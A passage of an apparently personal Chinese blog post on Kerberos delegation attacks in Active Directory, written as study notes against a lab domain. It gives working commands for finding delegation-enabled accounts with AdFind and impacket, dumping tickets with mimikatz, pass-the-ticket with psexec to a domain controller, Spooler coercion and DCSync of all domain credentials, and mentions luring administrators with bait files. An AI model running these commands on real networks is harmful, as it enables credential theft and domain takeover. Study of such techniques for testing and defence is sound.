+<p>这里就相当于说 jack 登录到web服务器后 访问后台文件服务器 是没有权限的 后台服务器以为是websvc在访问它，但如果websvc设置了委派 就可以以jack的身份去访问后台这样 就有权限访问 这个时候websvc也可以使用jack的身份访问其他jack有权限访问的服务</p>
+<h3 id="机器用户设置委派">机器用户设置委派</h3>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831102153813.png" alt="image-20230831102153813"></p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831102533487.png" alt="image-20230831102533487"></p>
+<h3 id="查找">查找</h3>
+<p>使用Adfind进行查找，Adfind使用可以看下面这个</p>
+<p><a href="https://blog.csdn.net/weixin_43571641/article/details/124263803">域内信息查询工具AdFind_adfind.exe 下载_Luckysec的博客-CSDN博客</a></p>
+<pre tabindex="0"><code>AdFind.exe -b &#34;DC=gkjzjh146,DC=com&#34; -f &#34;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34; cn distinguishedName
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831212012819.png" alt="image-20230831212012819"></p>
+<h3 id="利用场景">利用场景</h3>
+<h4 id="被动">被动</h4>
+<p>当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt（票据传递）获取该用户权限。</p>
+<p><strong>导出票据</strong></p>
+<pre tabindex="0"><code>mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::tickets /export&#34; exit
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831215857581.png" alt="image-20230831215857581"></p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831215927561.png" alt="image-20230831215927561"></p>
+<p><strong>传递票据</strong></p>
+<pre tabindex="0"><code>mimikatz.exe
+privilege::debug
+kerberos::ptt  adminstrator的会话
+psexec64.exe \\DC2012.0ne.test -accepteula -s cmd
+kerberos::list
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831220037845.png" alt="image-20230831220037845"></p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831220141135.png" alt="image-20230831220141135"></p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831220921221.png" alt="image-20230831220921221"></p>
+<pre tabindex="0"><code>klist
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831221033442.png" alt="image-20230831221033442"></p>
+<p>当然我们也可以诱导域管访问该主机，例如通过给管理员发诱饵文件修改Desktop.ini，或是outlook等等。详情可参考<a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/5">daiker师傅的发起NTLM请求</a>。</p>
+<h3 id="主动">主动</h3>
+<h4 id="非约束委派spooler打印机服务">非约束委派+Spooler打印机服务</h4>
+<p>在实战中，被动的非约束委派的利用需要和目标用户交互比较鸡肋。因此可以利用非约束委派+Spooler 打印机服务可以强制指定的主机进行连接。</p>
+<p>利用原理：利用 Windows 打印系统远程协议 (MS-RPRN) 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。
+POC: <a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a>
+在WIN7主机上运行该工具，强制域控向WIN7发起认证，然后导出票据</p>
+<pre tabindex="0"><code>kerberos::ptt xxxx.kirbi
+lsadump::dcsync /domain:0ne.test /all /csv
+</code></pre><h2 id="约束委派">约束委派</h2>
+<h3 id="概述-4">概述</h3>
+<p>由于非约束委派的不安全性，微软在windows server2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U。其中S4U支持两个子协议：</p>
+<ul>
+<li>Service for User to Self(<strong>S4U2self</strong>)</li>
+<li>Service for User to Proxy(<strong>S4U2proxy</strong>)</li>
+</ul>
+<p>这两个扩展都允许服务代表用户从KDC请求票证。S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST)；S4U2proxy可以以用户的名义请求其它服务的ST，约束委派就是限制了S4U2proxy扩展的范围。配置它后，约束委派将限制指定服务可以代表用户去访问服务。该设置需要<code>SeEnableDelegation</code>特权，该特权很敏感，通常仅授予域管理员。
+约束委派的安全问题就是如果我们找到配置了约束委派的服务账号，并且通过一定手段拿下该服务账号。我们就可以利用这个服务账号代表任意用户进行S4U2self获得一个可转发的票据，然后把获取到的票据用于S42proxy(作为AddtionTicket)，从而获取一个可转发的TGS，服务就可以代替任意用户访问另外一个服务(既被配置的约束委派的服务)。</p>
+<h3 id="配置">配置</h3>
+<p>先创建一个用户</p>
+<pre tabindex="0"><code>sql
+Admin123456
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831234733650.png" alt="image-20230831234733650"></p>
+<pre tabindex="0"><code>setspn -S MSSQLSvc/sql.gkjzjh146.com:1433 sql
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831234746938.png" alt="image-20230831234746938"></p>
+<pre tabindex="0"><code>setspn -l sql
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831234813176.png" alt="image-20230831234813176"></p>
+<p>设置委派</p>
+<p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230831234916413.png" alt="image-20230831234916413"></p>
+<h3 id="查找-1">查找</h3>
+<pre tabindex="0"><code>AdFind.exe -b &#34;DC=gkjzjh146,DC=com&#34; -f &#34;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&#34; cn distinguishedName msds-allowedtodelegateto
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230901083414097.png" alt="image-20230901083414097"></p>
+<p>也可以使用impacket工具包<code>findDelegation.py</code>找出所有的委派配置。</p>
+<pre tabindex="0"><code>impacket-findDelegation -dc-ip 192.168.45.144 -target-domain gkjzjh146.com gkjzjh146.com/zhangsan:zhang3..
+</code></pre><p><img src="https://gkjzjh146.github.io/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.assets/image-20230901083732646.png" alt="image-20230901083732646"></p>
+<h2 id="利用-3">利用</h2>
+<p>到后面和票据、基于资源的约束委派那些一起再写。。</p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/%E5%9F%9F/">域</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BD%E5%8F%96%E8%AF%81wp/" data-tooltip="【2023蓝帽】取证WP" aria-label="上一篇: 【2023蓝帽】取证WP">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/gkjzjh146.github.io\/post\/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0\/';
+        
+          this.page.identifier = '\/post\/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2023 gkjzjh146. All Rights Reserved
+  </span>
+    <br>
+    
+    <div class="busuanzi-footer">
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+        <span id="busuanzi_container_site_uv">
+    本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+    </div></footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BD%E5%8F%96%E8%AF%81wp/" data-tooltip="【2023蓝帽】取证WP" aria-label="上一篇: 【2023蓝帽】取证WP">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/kerberos%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fkerberos%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F%25E5%25AD%25A6%25E4%25B9%25A0%2F" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>分享到 Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fkerberos%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F%25E5%25AD%25A6%25E4%25B9%25A0%2F" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fkerberos%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F%25E5%25AD%25A6%25E4%25B9%25A0%2F" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>分享到 Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+    
+    <h4 id="about-card-name">gkjzjh146</h4>
+    
+      <div id="about-card-bio">会点web，会点misc</div>
+    
+    
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://gkjzjh146.github.io/images/3.jpeg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://gkjzjh146.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
